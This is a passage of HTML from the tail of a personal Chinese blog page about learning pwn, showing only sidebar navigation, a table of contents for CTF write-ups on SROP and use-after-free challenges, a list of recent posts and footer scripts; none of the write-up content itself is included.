onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/uncategorized/linux%E4%B8%8B%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"><img class="next-cover" src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/cropped.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">linux下的系统调用</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pdxbshx</div><div class="author-info__description">不需要去抱怨什么|</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2459745740&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是记录自己学习pwn的博客，欢迎各位大佬指教！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-s-3%EF%BC%88%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">ciscn_2019_s_3（系统调用）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">第一种解法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">第二种解法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP"><span class="toc-number">1.2.1.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SigreturnFrame%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">SigreturnFrame的使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.3.</span> <span class="toc-text">有关系统调用的知识点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hacknote-UAF"><span class="toc-number">2.</span> <span class="toc-text">hacknote(UAF)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uaf%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.</span> <span class="toc-text">uaf介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E7%BD%91%E5%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text">推荐网址</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第八周笔记"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="胡礼--第八周笔记"/></a><div class="content"><a class="title" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第八周笔记">胡礼--第八周笔记</a><time datetime="2022-11-09T17:10:53.160Z" title="发表于 2022-11-10 01:10:53">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/linux%E4%B8%8B%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" title="linux下的系统调用"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/cropped.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux下的系统调用"/></a><div class="content"><a class="title" href="/uncategorized/linux%E4%B8%8B%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/" title="linux下的系统调用">linux下的系统调用</a><time datetime="2022-11-07T15:08:25.209Z" title="发表于 2022-11-07 23:08:25">2022-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/%E6%A0%88%E4%B8%8E%E5%A0%86%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" title="栈与堆的深入理解"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/Kimi-no-Na-Wa-night-night-sky.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈与堆的深入理解"/></a><div class="content"><a class="title" href="/uncategorized/%E6%A0%88%E4%B8%8E%E5%A0%86%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" title="栈与堆的深入理解">栈与堆的深入理解</a><time datetime="2022-11-07T15:07:15.921Z" title="发表于 2022-11-07 23:07:15">2022-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E4%B8%83%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第七周笔记"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/saber1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="胡礼--第七周笔记"/></a><div class="content"><a class="title" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E4%B8%83%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第七周笔记">胡礼--第七周笔记</a><time datetime="2022-11-07T15:05:29.305Z" title="发表于 2022-11-07 23:05:29">2022-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AD%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第六周笔记"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/saber1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="胡礼--第六周笔记"/></a><div class="content"><a class="title" href="/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AD%E5%91%A8%E7%AC%94%E8%AE%B0/" title="胡礼--第六周笔记">胡礼--第六周笔记</a><time datetime="2022-11-07T15:03:16.610Z" title="发表于 2022-11-07 23:03:16">2022-11-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By pdxbshx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,诚信,敬业,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
